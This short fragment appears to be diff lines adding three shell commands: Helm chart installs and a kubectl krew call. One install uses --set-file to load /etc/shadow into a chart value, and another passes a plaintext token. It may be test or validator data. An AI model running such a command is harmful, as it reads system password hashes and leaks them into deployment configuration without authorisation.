+helm install web ./chart --set-string token=hunter2
+helm install web ./chart --set-file x=/etc/shadow
+kubectl krew
